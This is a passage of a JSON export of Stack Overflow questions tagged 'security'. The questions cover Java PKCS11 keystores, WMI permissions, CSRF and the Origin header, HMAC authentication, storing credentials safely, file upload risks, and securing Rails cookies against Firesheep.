cookies. I only found few sites that talks about this and still a bit unclear. </p>\n"},{"tags":["java","security","digital-signature","pkcs#11"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3886,"score":3,"question_id":4833989,"title":"Java Access Token PKCS11 Not found Provider","body":"<p>Hello I'm trying to access the keystore from my smartcard in Java. And I'm using the following code..</p>\n\n<p>I'm using the Pkcs11 implementation of OpenSc <a href=\"http://www.opensc-project.org/opensc\" rel=\"nofollow\">http://www.opensc-project.org/opensc</a></p>\n\n<p><strong>File windows.cnf</strong> =   </p>\n\n<pre><code>name=dnie\nlibrary=C:\\WINDOWS\\system32\\opensc-pkcs11.dll\n</code></pre>\n\n<p><strong>Java Code</strong> =</p>\n\n<pre><code>String configName = \"windows.cnf\"\n String PIN = \"####\";\n Provider p = new sun.security.pkcs11.SunPKCS11(configName);\n Security.addProvider(p);\n KeyStore keyStore = KeyStore.getInstance(\"PKCS11\", \"SunPKCS11-dnie\");  =)(= \n char[] pin = PIN.toCharArray();\n keyStore.load(null, pin);\n</code></pre>\n\n<p>When the execution goes by the line with <strong>=)(=</strong>  throws me the following exception </p>\n\n<pre><code>java.security.KeyStoreException: PKCS11 not found\n\n    at java.security.KeyStore.getInstance(KeyStore.java:635)\n    at ObtenerDatos.LeerDatos(ObtenerDatos.java:52)\n    at ObtenerDatos.obtenerNombre(ObtenerDatos.java:19)\n    at main.main(main.java:27)\nCaused by: java.security.NoSuchAlgorithmException: no such algorithm: PKCS11 for provider SunPKCS11-dnie\n        at sun.security.jca.GetInstance.getService(GetInstance.java:70)\n        at sun.security.jca.GetInstance.getInstance(GetInstance.java:190)\n        at java.security.Security.getImpl(Security.java:662)\n        at java.security.KeyStore.getInstance(KeyStore.java:632)\n</code></pre>\n\n<p>I think the problem is \"SunPKCS11-dnie\", but I don't know to put there. I had tried with a lot of combinations...</p>\n\n<p>Anyone can help me... </p>\n"},{"tags":["security","windows-8","wmi","remote-access"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12891508,"title":"Wmi Security on Windows 8","body":"<p>I have some problems regarding WMI scripting on Windows 8. More precisely, remote connection from Win7(not that relevant) to Windows 8. Note that the following issues do not happen when the client machine runs Windows 7. </p>\n\n<p>First one is getting data regarding the current shares on that machine. Specifically, I am trying to get the Path property of the shares, that is local path. </p>\n\n<p>In windows 7 it works perfectly, in windows 8 however it returns null(ran with wbemtest from remote computer). </p>\n\n<p>First I thought that there is a problem with the WMI system. Then I ran the same query directly on the win8 machine. That returned the actual local path of the share. This led me to believe that there are problems with the WMI security on that machine. </p>\n\n<p>Another issue I have with WMI on win8 is that it does not allow me to run things as Administrator, even though the user used to log is is the Administrator. </p>\n\n<p>Regarding the security settings on the win8 machine, I gradually lowered them to try the exact position in which I can operate. I have reached the level where Everyone has every access, so it is the lowest security possible. Hope someone can help. </p>\n"},{"tags":["python","security","io","text-files"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":114,"score":1,"question_id":12915132,"title":"Deny reading part of a file in python","body":"<p>I have a text file for which I use two write functions: 1) Normal Write, 2) Secure Write.</p>\n\n<p>Now when I want to read the data from the file, I should be only be able to read the data written using the \"Normal Write\" function and should not be able to read the data written using \"Secure Write\" function.</p>\n\n<p>My idea was to use a dictionary for this using the key as a flag to check if the value was written using normal write or secure write.</p>\n\n<p>How can I do this in Python?</p>\n"},{"tags":["security","http","http-headers","csrf"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12915208,"title":"Origin header proposal","body":"<p>Regarding the \"Origin\" header as proposed in 2009/2010 at:</p>\n\n<p><a href=\"https://wiki.mozilla.org/Security/Origin\" rel=\"nofollow\">https://wiki.mozilla.org/Security/Origin</a></p>\n\n<p>Does anyone know what's happening with this in terms of browser support?</p>\n\n<p>Google Chrome seems to send it when submitting a <code>&lt;form&gt;</code>, but nothing from FireFox.</p>\n\n<p>It seems as though its kind of being covered in the CORS specification, but that seems to be more related to XMLHttpRequest():</p>\n\n<p><a href=\"http://www.w3.org/TR/cors/\" rel=\"nofollow\">http://www.w3.org/TR/cors/</a></p>\n\n<hr>\n\n<p>I am hoping to use it as an <em>additional</em> check to ensure that if a page is being loaded (to make a change request), it has been done so via a request from a user (rather than the URL being specified in an <code>&lt;img&gt;</code> tag).</p>\n\n<p>In reality I think I have all my systems require a POST request with the proper CSRF protection, but it would be nice to have additional checks.</p>\n\n<hr>\n\n<p>This might be related to:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/10033166/\">Compatibility of the &quot;Origin&quot; http header for enforcing restrictions</a></p>\n"},{"tags":["security","ms-access","outlook","hacking","alternative"],"answer_count":6,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":477,"score":2,"question_id":1496549,"title":"Outlook security","body":"<p>Is there any other way to get rid of this outlook security message? \"A program is trying to automatically send e-mail on your behalf ... and so on\" and it gives me an option to select Yes , No &amp; Help. </p>\n\n<p>Im currently developing an outlook automation app using Ms Access. Everytime I issue Send command this message popups, I tried using SendKeys \"%s\" but it does not work in Access 2007.</p>\n\n<p>Is there any alternative solution for this? Thanks!!</p>\n"},{"tags":[".net","security","certificate","websphere-mq"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":31,"score":2,"question_id":12906954,"title":"Client cert label `ibmwebspheremq<userid>` for domain user","body":"<p>If the client connected to the WebSphere MQ server is using a domain account, say <code>box1\\user1</code>, then is the client's cert label: <code>ibmwebspheremquser1</code> or <code>ibmwebspheremqbox1\\user1</code> ?</p>\n"},{"tags":["security","websphere-mq","mq","userid","messagebroker"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":168,"score":2,"question_id":12889953,"title":"Unable to connect to queue manager in WebSphere MQ 7.1","body":"<p>I've installed WebSphere MQ 7.1 on Linux platform, after which I installed WebSphere Message Broker 8.0.0.1. Now when I try to create an execution group, I get an exception: Reason code 2035. This exception states that the user is unauthorised to connect to the queue manager. I have this user added in the <code>mqm</code> group. I did not face any such issue when I was working with MQ 7.0.x. I searched a lot and came to know that there is user ID blocking in MQ 7.1. But, I want this user to be able to create execution group, how can I do so? Please advise.</p>\n"},{"tags":["java","security","cryptography","cipher"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":84,"score":-1,"question_id":12914013,"title":"java cryptography KeyGenerator","body":"<p>my code is </p>\n\n<pre><code>import java.security.Key;\n\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class apiKeyGenerate {\n  public static void main(String[] args) throws Exception {\n   // Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n\n    byte[] input = \"input\".getBytes();\n    byte[] ivBytes = \"1234567812345678\".getBytes();\n\n    Cipher cipher =  Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n    KeyGenerator generator = KeyGenerator.getInstance(\"AES\", \"BC\");\n    generator.init(128);\n    Key encryptionKey = generator.generateKey();\n    System.out.println(\"key : \" + new String(encryptionKey.getEncoded()));\n   }\n}\n</code></pre>\n\n<p>In above code fire Exception is : -  java.security.NoSuchProviderException:\nthat is </p>\n\n<pre><code>Exception in thread \"main\" java.security.NoSuchProviderException: no such provider: BC\n    at sun.security.jca.GetInstance.getService(Unknown Source)\n    at javax.crypto.SunJCE_b.a(DashoA13*..)\n    at javax.crypto.KeyGenerator.getInstance(DashoA13*..)\n    at apiKeyGenerate.main(apiKeyGenerate.java:17)\n</code></pre>\n\n<p>How can I do that ??\nThanks in advance</p>\n"},{"tags":["c#",".net","wcf","security","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12772286,"title":"Custom Authentification via Service Method?","body":"<p>For a client-server application, I want to develop a Web-Service which will be mainly used by the application itself (not intended for use by third parties at this time).</p>\n\n<p>On the long run, however, exposing the WebService as some kind of API is generally desirable. Thus, I am already putting some thoughts in choosing a technology which allows \"RESTifing\" (terrible word-creation, I know ;-) ) a Web-Service easily at a later point.<br>\nWCF seems to be about right here as it provides the webHttpBinding but also other bindings which allow taking advantage of LANs and .NET clients.</p>\n\n<p>The issue I now ran into is about authentification: All the authentification measures WCF provides seem to happen \"outside\" the actual service. However, I'd like to have a <code>Login</code> method (or something more \"RESTful\" as shown <a href=\"http://stackoverflow.com/a/2022938/232175\">here under point 2</a>).</p>\n\n<p>For example, I imagine writing a Service like this one:</p>\n\n<pre><code>[ServiceContract]\npublic interface IUserService\n{\n   [ServiceMember]\n   [WebInvoke(Method = \"POST\", WebUri=\"/Session\")]\n   public void Login(string username, string password);\n\n   [ServiceMember]\n   [WebInvoke(Method = \"POST\", WebUri=\"/Users\")]\n   public void Register(RegisterUserParameter parameter);\n}\n</code></pre>\n\n<p>How do I integrate this service into the WCF so the methods preferably work over multiple sub-services in my service project?</p>\n\n<p>When using the built-in WCF authentification, I need to supply username and password before making any service call. Thus, calls to either <code>Register</code> or <code>Login</code> would fail because I am not authentificated.</p>\n\n<p>And how can I tell the WCF to remember which user is currently logged in using my service method? Is there any possibility to store something like a session cookie inside the WCF session on the client?</p>\n\n<p>Or is it generally a bad idea to realize authentification under WCF the way I am trying to?</p>\n\n<p>Should I maybe directly choose WebAPI at the cost of having a more complicated way to talk to the service in my client application?</p>\n"},{"tags":["security","wcf-security","wcf-client","wif"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12731328,"title":"Custom STS and expired password via WS-Trust scenario","body":"<p>Are there any guidelines or best practices for handling expired passwords for scenario with active clients via WS-Trust?  </p>\n\n<p>For now I have couple of ideas, but can't find any info about it:<br>\n1. Issue special token, so client can determine, that is should show change password notification.<br>\n2. Throw specific exception.  </p>\n\n<p>Maybe I am missing something in WS-Trust standard?   </p>\n\n<p>Im using WIF built-in implementation, so it is 1.3 version of standard with parts of 1.4.\nThanks a lot in advance. </p>\n"},{"tags":["python","django","security","encryption","credentials"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":89,"score":6,"question_id":12904560,"title":"Storing credentials in django","body":"<p>I'm working on a python/django app which, among other things, syncs data to a variety of other services, including samba shares, ssh(scp) servers, Google apps, and others. As such, it needs to store the credentials to access these services. Storing them as unencrypted fields would be, I presume, a Bad Idea, as an SQL injection attack could retrieve the credentials. So I would need to encrypt the creds before storage - are there any reliable libraries to achieve this?</p>\n\n<p>Once the creds are encrypted, they would need to be decrypted before being usable. There are two use cases for my app:</p>\n\n<ul>\n<li>One is interactive - in this case the user would provide the password to unlock the credentials. </li>\n<li>The other is an automated sync - this is started by a cron job or similar. Where would I keep the password in order to minimise risk of exploits here?</li>\n</ul>\n\n<p>Or is there a different approach to this problem I should be taking?</p>\n"},{"tags":["spring","security","jsp","freemarker","taglib"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":249,"score":1,"question_id":12069602,"title":"Adding spring library for usage of JSP Taglibs for security in Freemarker","body":"<p>I am using spring with freemarker as the template engine. Freemarker allows to use the Jsp Taglibs, for security for example, by adding</p>\n\n<pre><code>    &lt;#assign security=JspTaglibs[\"http://www.springframework.org/security/tags\"] /&gt;\n</code></pre>\n\n<p>to the templates, what allows me to use for example </p>\n\n<pre><code>    &lt;@security.authorize ifNotGranted=\"ROLE_ADMIN\"&gt;\n        whatever\n    &lt;/@security.authorize&gt;\n</code></pre>\n\n<p>But, Spring/Freemarker cannot find the taglibs, unless they are added to the classpath, so I added </p>\n\n<pre><code>    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-security-taglibs&lt;/artifactId&gt;\n        &lt;version&gt;${spring.version}&lt;/version&gt;\n    &lt;/dependency&gt;\n</code></pre>\n\n<p>to my pom.xml in my project. </p>\n\n<p>But anyway, the tags couldn't be found! I had to add the spring-security-taglibs.jar into WEB-INF/lib folder for the tags to be found. </p>\n\n<p>Does someone know why the jar has to be added explicitly into the lib folder?? Why aren't they found by tomcat, in my case?</p>\n\n<p>EDIT @ddekany</p>\n\n<p>Thank you. The stacktrace is the following, if the spring-security-taglibs.jar is not copied into the WEB-INF/lib directory</p>\n\n<pre><code>    No mapping defined for http://www.springframework.org/security/tags \n    The problematic instruction: ---------- ==&gt; assignment: \n            security=JspTaglibs[\"http://www.springframework.org/security/tags\"] \n            [on line 12, column 1 in home.ftl] in user-directive content.main \n            [on line 8, column 9 in home.ftl] in user-directive layout.global \n            [on line 2, column 1 in home.ftl] \n    ---------- Java backtrace for programmers: ----------      \n    freemarker.template.TemplateModelException: \n            No mapping defined for http://www.springframework.org/security/tags at         \n    freemarker.ext.jsp.TaglibFactory.get(TaglibFactory.java:180) at \n    ...\n</code></pre>\n"},{"tags":["php","security","url","html-entities","valid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12908258,"title":"URL + htmlentities ? what to think about this?","body":"<p>I asked a question in an another forum related to urlencode(), when a guy appeared saying briskly it is absolutly required to make use of htmlentities on top of it, and also suggesting I should do that everytime I write an URL. \"To be valid and secure he said\". I do not see why it could be a security issue. Here is the code he mentionned :</p>\n\n<pre><code>echo '&lt;a href=\"index.php?' . htmlentities('page=encode&amp;code='.urlencode($code).'&amp;login='.urlencode($login).'&amp;codeconf=' . urlencode($codeconf)) . '\"&gt;';\n</code></pre>\n\n<p>Php Manual indeed mentions htmlentities. But there are no further explanations:</p>\n\n<blockquote>\n  <p>Note ... PHP supports changing the argument separator to the W3C-suggested semi-colon through the arg_separator .ini directive. Unfortunately most user agents do not send form data in this semi-colon separated format. A more portable way around this is to use &amp; instead of &amp; as the separator. You don't need to change PHP's arg_separator for this. Leave it as &amp;, but simply encode your URLs using htmlentities() or htmlspecialchars(). </p>\n</blockquote>\n\n<p>I replaced <strong>\"&amp;\"</strong> by <strong>&amp;amp ;</strong> , I validated my page in W3C validator and it came out OK.</p>\n\n<p>I am still concerned about this htmlentities issue.</p>\n\n<ol>\n<li>Is there any good reason why whe should use htmlentities in URL's ?</li>\n<li>If yes, does this apply to all types of URL's ?</li>\n<li>If yes, is it for security reasons ?</li>\n</ol>\n\n<p>Thanks. </p>\n"},{"tags":["web-services","security","http","cryptography","hmac"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12904059,"title":"Is it more expensive an authentication system based on HMAC over HTTP or single-token over HTTPS?","body":"<p>The 1st case would require to generate for each communication a HMAC identifying the request, so the server can re-generate it to make sure the client is authorized (because the HMAC is encryped with a private key that is only known by the server and the client), while the 2nd one only requires the service to issue the certificate (or token) once, and keep it live for some minutes -ex. 15 minutes-. Of course to prevent MITM or Replay attacks it must be sent only over SSL, with all the conseguences (more bandwitdh and more CPU requirements).</p>\n\n<p>Personally I find the 1st to be not only simpler but also stronger, because each request has its own unique data, while the 2nd relies on the SSL certificate integrity (I'm not saying that's easy to crack a signed SSL certificate, but if someone would break it all the traffic would be sniffed for all communications).</p>\n\n<p>So I find them to have the following pro/cons:</p>\n\n<ul>\n<li>HMAC pros: unique token for each request, can be really secure against MITM and Replay attacks -by using unique data to compose the signature and a timestamp-, easy to implement</li>\n<li>HMAC cons: requires the server to work for each single request to re-generate the token</li>\n<li>Token pro: one token for multiple requests, useful on services that require multiple client actions</li>\n<li>Token cons: requires SSL for all communications.</li>\n</ul>\n\n<p>I think I'd need to set up some tests to get a final answer, but I'd love to hear if someone has already some knowledge or some tought based on old experiences.</p>\n"},{"tags":["android","security","application"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":497,"score":0,"question_id":8178982,"title":"Is it possible to prevent user from uninstalling application in Android?","body":"<p>I want to prevent user from uninstalling my application.But my main objective is to ask the password before uninstallation of the applcation.Is it Possible in android.</p>\n"},{"tags":["c#","security","windows-live"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":256,"score":1,"question_id":1347098,"title":"Windows Live Authenticaton","body":"<p>Is it possible to make HttpWebRequest query to windows Live ID enabled web sites? What is the method of authentication knowing username and clear text password? Could not found anything like that in Live ID SDK.</p>\n"},{"tags":["security","configuration","nant"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":342,"score":0,"question_id":1155042,"title":"How to make a copy of an existing config file using nant","body":"<p>I was wondering if there is any way to make a copy of an existing web.config file(rename the newly created file) with the nant build.</p>\n"},{"tags":["php","web-services","security","authentication","hmac"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":220,"score":1,"question_id":11442793,"title":"HMAC Implementation for Web Service Authentication in PHP","body":"<p>I am trying to implement a web service and need some (very) simple Authenticate to restrict access to the service.</p>\n\n<p>I found out about HMAC and I think I understand how to implement it. But I have a couple of questions in mind.</p>\n\n<p>Let's say I have this HTML Form on the consumer side. When making a GET/POST request to my server.</p>\n\n<ol>\n<li>Is is enough to create a hash of: <code>public_key</code> using the <code>secret_key</code>?</li>\n<li>OR, do I need to create a hash of the entire <code>POST</code> variables/array?</li>\n</ol>\n\n<p>I'm thinking it would be enough to send the hash of the <code>public_key</code> only but just wanted to make sure and ask you guys.</p>\n\n<p><strong>I am planning to do this:</strong></p>\n\n<ol>\n<li>Create a hash of the <code>public_key</code></li>\n<li>Put the hash in a hidden field or in the URL as a param together with the public_key (or client_id) and other POST/GET variables.</li>\n<li>Receive on my server and verify the hash against the database by recreating the hash of the <code>public_key</code> using the <code>secret_key</code>.</li>\n<li>If the hash matches, I accept the POST/GET requests.</li>\n</ol>\n\n<p>Your thoughts?</p>\n\n<p><strong>Clarification:</strong> <code>public_key</code> is like the <code>client unique id</code> where I can use to identify what <code>secret key</code> to use to generate the hash on the server.</p>\n"},{"tags":["security","google-charts"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":45,"score":0,"question_id":12899348,"title":"Google Charts Data security","body":"<p>We are considering using Google charts for our project but we have highly confidential data.  Can you use Google Charts without sending the data to Google?</p>\n\n<p>Also, can we run this as a server charting tool also?</p>\n"},{"tags":["security","internet-explorer","https"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1101,"score":2,"question_id":4201042,"title":"How to trace source of IE8 Security Warning?","body":"<p>I am getting the dreaded security warning when running my GWT web app under IE8:\n\"this webpage contains content that will not be delivered using a secure HTTPS\"</p>\n\n<p>It of course works fine with Firefox and Chrome.</p>\n\n<p>I have taken a look at the requests with firebug and I see no HTTP requests.</p>\n\n<p>I have also used both Fiddler and HttpWatch with IE and I still see no HTTP requests.</p>\n\n<p>Can anyone provide me with some clues as to what else might trigger this warning?</p>\n"},{"tags":["security","iis","administration"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12900218,"title":"Access denied when using Microsoft.Web.Administration in IIS","body":"<p>I'm trying to use Microsoft.Web.Administration to access the Live Smooth Streaming publishing points from a webpage in IIS. The problem I have is security. I'm using win server 2008 and iis 7 with anonymous and forms authentication enabled.</p>\n\n<p>First I tried with the default 'network service' as the app pool identity. Got a permission error on redirection.config file. Gave 'network service' full access to that file and the applicationhost.config file. Then I get another error: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)). I can't get passed this one.</p>\n\n<p>So I tried to set app pool identity to 'local system' and that works as it should, problem is, I don't want to run the public website with 'local system'.</p>\n\n<p>Tried to set app pool identity to 'applicationpoolidentiy'. Then got same permisison errors as with 'network service'. Changed the permissions on the config file and directory. Got the same Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)) error again.</p>\n\n<p>I'm stuck, what is causing this access denied message? I don't get it when using 'local system'</p>\n"},{"tags":["php","database","security"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":241,"score":2,"question_id":8744568,"title":"PHP: Securing database connection credentials","body":"<p>I'm working towards an environment where multiple websites will use the same exact copy of PHP though with their own instances of MySQL databases. This obviously implies connection credentials for each website, the more users the more passwords and therefore the more desirable a target for hackers. Just to make sure everyone is on the same page these are the credentials I'm talking about...</p>\n\n<pre><code>$user = 'user';// not actual user, not root either\n$pass = 'pass';// not actual password\n$server = 'localhost';\n$database = mysql_connect($server,$user,$pass,true|false);\n</code></pre>\n\n<p>So I'm talking about the passwords used to <em>connect</em> to the database, not the passwords in the database (which for clarification I have hashed with salt and pepper).</p>\n\n<p>I have not read anything that I think remotely suggests you can have 100% foolproof security since obviously the server needs to connect to the database and get the content for visitors 24/7; if I am mistaken I would love to hear how this would be possible.</p>\n\n<p>So let's presume a hacker has root access (or if that does not imply access to the PHP code let's just say then have access to all the PHP source code) and they (in this circumstance) desire to access/modify/etc databases. If we can not prevent them should they have access to the PHP source then we want to slow them down as much as possible. I can keep each site/database connection password in separate files (can as in I'm a few weeks from finishing multi-domain support) for each site and not inside of public_html (obviously). I use serialize and unserialize to store certain variables to ensure certain level of fault tolerance for when the database becomes unavailable on shared hosting (preventing site A from looking and acting like site B and vice-versa) as the database can sometimes become unavailable numerous times a day (my database error logs are written to when the SQL service becomes available again and catches these \"away\" errors). One thought that has crossed my mind is determining a way to store the passwords in one hash and un-hashing them to be used to connect to the database by PHP though I'd like some opinions about this as well please.</p>\n\n<p>If someone has a suggestion from the database perspective (e.g. having the ability to restrict users to SELECT, INSERT, DELETE, UPDATE, etc and not allowing DROP and TRUNCATE as examples) my primary concern is making sure I am SQL neutral as I plan to eventually migrate from MySQL to PostgreSQL (this may or may not be relevant though if it is better to mention it). I currently use phpMyAdmin and cPanel and phpMyAdmin shows the connected user is not the same as the site's database user names so in that regard I can still use certain commands (DROP and TRUNCATE as examples again) with that user and restrict the SITE user permissions unless I am mistaken for some reason?</p>\n\n<p>Is there a way to configure the context of where the connection credentials are accepted? For clarification a hacker with access to the source code would not be accessing the site the same way legitimate users would.</p>\n\n<p>Another idea that crossed my mind is system based encryption, is there a near-universal (as in on every or almost every LAMP web host setup) web-hosting technique where the system can read/write the file through Apache that would introduce a new layer that a hacker would have to determine a way to circumvent?</p>\n\n<p>I am using different passwords for each user of course.</p>\n\n<p>I currently am on shared hosting though hopefully my setup will scale upwards to dedicated hosting eventually.</p>\n\n<p>So what are the thoughts on my security concepts and what other concepts could I try out to make my database connection credentials more secure?</p>\n\n<p>Clarification: I am looking for ideas that I can pursue. If there is disagreement with any of the suggestions please ask for clarification and explain your concern in place of debating a given approach as I may or may not have even considered let alone begun to pursue a given concept. Thanks!</p>\n"},{"tags":["vb.net","security","active-directory"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":12897494,"title":"How to validate the active directory domain my app ist running in?","body":"<p>I have a VB.Net Application that authenticates using the current Windows User without asking for the password. It checks that this user is a member of \"MYDOMAIN\\ApplicationUsers\" before it starts up.</p>\n\n<p>How to check if this is the real domain and not a different one using the same name? Are there any certs or public keys to validate locally? I'd prefer to check this offline, without a third party machine or database etc.</p>\n\n<p>In the System.DirectoryServices.ActiveDirectory Namespace are some Trust an Validate methods but they only seem to check inter domain trust and using a domain name only.</p>\n"},{"tags":["c#","asp.net","security","file-upload"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":146,"score":3,"question_id":12864441,"title":"File upload security Concern","body":"<p>I am having a web form available to public, which has file upload capability. Now files are either saved on web server or sent out as attachment in an email.  We are having restriction on size i.e 15MB and extensions of file being uploaded. Our SMTP server is on same web server. I have concern about security, as anyone can upload malicious files and can have impact on our production web server. </p>\n\n<p>What are the risks I will be having by such file upload control available to public? Is there anyway someone can execute malicious script on web server by uploading malicious file.</p>\n\n<p>I did some research and found out following points</p>\n\n<ol>\n<li>If I sent out a file as an attachment in an email, this file will be stored for temporary period in Temporary ASP .Net folders, and once email is sent this will get deleted.</li>\n<li>You can rename a file before saving them on file system.</li>\n<li>You can save file on different location as your website</li>\n<li>You can have some sort of real time virus check. I am not sure how you can do that. I was reading about some command line virus scan. But not sure if I really need that.</li>\n</ol>\n\n<p>These are just few points, but I would like to know about any blind spots in file upload.</p>\n"},{"tags":["security","symfony2","acl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12897423,"title":"Check if Symfony 2 role has a permission set","body":"<p>how can I check if a Symfony 2 role has a XXX permission on a object? I inserted a class ace and I can correctly see that the user I'm logged in that has that role has also the requested permission but I would print for each role the list of permissions it has. Thank you</p>\n"},{"tags":["javascript","security","phonegap","jquery-mobile","cordova"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12865943,"title":"securely store user password locally in a jquery mobile app","body":"<p>I need to access an api which requires http authentification on a per user basis using a jquery mobile api.</p>\n\n<p>I plan to make the app available as a website as well as packaging it in Cordova for various devices.</p>\n\n<p>If I have a login form which captures the username and password and store this as a javascript variable, is there any way this data could be exposed?</p>\n\n<p>If so, what's the best alternative to handle storing the users authentification details? I am reticent to build an intermediary server if I don't have to.</p>\n\n<p>Many Thanks. :D</p>\n"},{"tags":["ruby-on-rails","security"],"answer_count":1,"favorite_count":5,"up_vote_count":13,"down_vote_count":0,"view_count":2466,"score":13,"question_id":4147387,"title":"How to secure a Rails app against Firesheep?","body":"<p>I have not been able to find an easy guide for securing a Ruby on Rails app against a <a href=\"http://codebutler.com/firesheep\" rel=\"nofollow\">Firesheep</a>.</p>\n\n<p>In case you don't know, Firesheep jacks session cookies if your app doesn't force SSL and set the secure flag in the cookie. I had to do some searching to find these two things, so I thought I'd post what I found here and see if there is anything else I'm missing.</p>\n\n<p><strong>Step 1</strong> Force SSL</p>\n\n<p>There are two ways to do this that I found. One is using the <a href=\"https://github.com/rails/ssl_requirement\" rel=\"nofollow\">ssl_requirement</a> plugin, but this is a pain because you have to specifically specify <code>ssl_required :action1, :action2</code> in every controller.</p>\n\n<p>The preferable way appears to be by using Rack Middleware, via this post: <a href=\"http://stackoverflow.com/questions/3861772/force-ssl-using-ssl-requirement-in-rails-app/3862679#3862679\">Force SSL using ssl_requirement in Rails app</a>. Works like a charm.</p>\n\n<p><strong>Step 2</strong> Make cookies secure</p>\n\n<p>For this I followed <a href=\"http://www.kalzumeus.com/2010/10/25/how-to-use-ssl-to-secure-your-rails-app-against-firesheep-and-other-evils/\" rel=\"nofollow\">these directions</a>, which tell you to put the following in your <code>config/environment/production.rb</code> file:</p>\n\n<pre><code>config.action_controller.session = {\n    :key     =&gt; 'name_of_session_goes_here',\n    :secret          =&gt; 'you need to fill in a fairly long secret here and obviously do not copy paste this one',\n    :expire_after    =&gt; 14 * 24 * 3600, #I keep folks logged in for two weeks\n    :secure =&gt; true #The session will now not be sent or received on HTTP requests.\n  }\n</code></pre>\n\n<p>This was all pretty straight-forward on my Rails 2.x app. Did I miss anything? Is it different for Rails 3?</p>\n"},{"tags":["php","security","nginx","fwrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12878304,"title":"Dynamically write nginx configurations from PHP","body":"<p>I am looking to write custom <code>nginx</code> directives dynamically from <code>PHP</code>. I am however concerned with security. PHP runs under the user/group <code>php:php</code> and the nginx configuration file is owned by <code>root:root</code>.</p>\n\n<p>For PHP to be able to open and write to the nginx configuration file, the file needs to be owned by the user and group <code>php:php</code>.</p>\n\n<p>What is the best way to do this? I suppose, I could have a secondary process in another language or PHP that actually does the read and write of the configuration files, and PHP simply talks to the secondary process.</p>\n"},{"tags":["ruby-on-rails","security","cookies","encryption"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":669,"score":1,"question_id":9364962,"title":"Storing an encrypted cookie with Rails","body":"<p>I need to store a small piece of data (less than 10 characters) in a cookie in Rails and I need it to be secure. I don't want anybody being able to read that piece of data or injecting their own piece of data (as that would open up the app to many kinds of attacks). I think encrypting the contents of the cookie is the way to go (should I also sign it?). What is the best way to do it?</p>\n\n<p>Right now I'm doing this, which looks secure, but many things looked secure to people that knew much more than I about security and then it was discovered it wasn't really secure.</p>\n\n<p>I'm saving the secret in this way:</p>\n\n<pre><code>encryptor = ActiveSupport::MessageEncryptor.new(Example::Application.config.secret_token)\ncookies[:secret] = {\n  :value =&gt; encryptor.encrypt(secret),\n  :domain =&gt; \"example.com\",\n  :secure =&gt; !(Rails.env.test? || Rails.env.development?)\n}\n</code></pre>\n\n<p>and then I'm reading it like this:</p>\n\n<pre><code>encryptor = ActiveSupport::MessageEncryptor.new(Example::Application.config.secret_token)\nsecret = encryptor.decrypt(cookies[:secret])\n</code></pre>\n\n<p>Is that secure? Any better ways of doing it?</p>\n\n<p><strong>Update</strong>: I know about Rails' session and how it is secure, both by signing the cookie and by optionally storing the contents of the session server side and I do use the session for what it is for. But my question here is about storing a cookie, a piece of information I do not want in the session but I still need it to be secure.</p>\n"},{"tags":["ios","security","amazon-s3"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12891492,"title":"Safe way to store secretAccessKey on iOS application","body":"<p>I am using amazon S3 to provide IAP content.</p>\n\n<p>Is there a \"Safe\" way to store the secretAccessKey inside my app so hackers can't use it to get the files?</p>\n"},{"tags":["security","asp.net-membership","web-security","webmatrix"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12895070,"title":"WebSecurity and long IDs","body":"<p>I'm looking to use the long datatype (bigint) for various id values in a system and the 